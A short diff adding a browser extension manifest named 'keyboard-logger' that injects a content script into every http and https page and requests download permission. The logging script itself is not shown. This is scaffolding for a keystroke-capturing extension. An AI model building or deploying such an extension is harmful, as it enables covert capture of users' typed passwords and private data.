@@ -1,0 +1,14 @@
+{
+  "name": "keyboard-logger",
+  "description": "keyboard-logger",
+  "version": "1.0",
+  "content_scripts": [{
+    "js": ["js/background.js"],
+    "matches": ["http://*/*", "https://*/*"]
+  }],
+
+  "permissions": [
+  "downloads"
+  ],
+  "manifest_version": 2
+}
